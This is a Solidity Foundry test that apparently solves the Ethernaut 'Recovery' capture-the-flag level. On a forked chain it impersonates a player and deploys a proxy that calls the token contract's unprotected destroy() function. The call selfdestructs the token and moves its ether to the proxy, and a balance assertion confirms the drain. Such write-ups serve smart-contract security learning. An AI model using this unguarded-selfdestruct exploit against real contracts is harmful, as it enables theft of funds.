// SPDX-License-Identifier: UNLICENSED

// forge test --contracts src/test/King.t.sol --fork-url $rpc -vvvv
pragma solidity ^0.6.0;

import "ds-test/test.sol";
import "forge-std/console.sol";
import "forge-std/Vm.sol";
import "../Recovery.sol";

contract ProxyRecovery {
    SimpleToken obj;
    
    constructor(address payable addr) public {
        obj = SimpleToken(addr);
    }
    function destroy() public {
         obj.destroy(payable(address(this)));
    }

}
contract RecoveryTest is DSTest {
    Recovery obj;
    ProxyRecovery proxy_Recovery;
    SimpleToken simple_token;
    Vm vm = Vm(HEVM_ADDRESS);
    address payable player_address;
    address contract_address;
    address payable token_address;
    function setUp() public {
        contract_address = 0x883Ede67962d495989cf0952c44D7cD8B206f25e;
        token_address = 0xe490FA4c61b59C58d58c661c371A0AEa5f8C1979;
        player_address = 0xae22f26D5ddfE22d24aA28AEB1D44c962c673438;
        obj = Recovery(contract_address);
        // obj = new Recovery(player_address);
        proxy_Recovery = new ProxyRecovery(token_address);
        simple_token = SimpleToken(token_address);
    }

    function testRecovery() public {
        vm.startPrank(player_address);
        console.log("Proxy Recovery Address =", address(proxy_Recovery));
        console.log("Proxy Recovery initial balance =", address(proxy_Recovery).balance);
        uint256 bal = address(simple_token).balance;
        console.log("Initial balance =", bal);

        proxy_Recovery.destroy();
        console.log("End balance =", address(simple_token).balance);
        console.log("Proxy Recovery end balance =", address(proxy_Recovery).balance);
        assertEq(address(proxy_Recovery).balance, bal);
    }
}
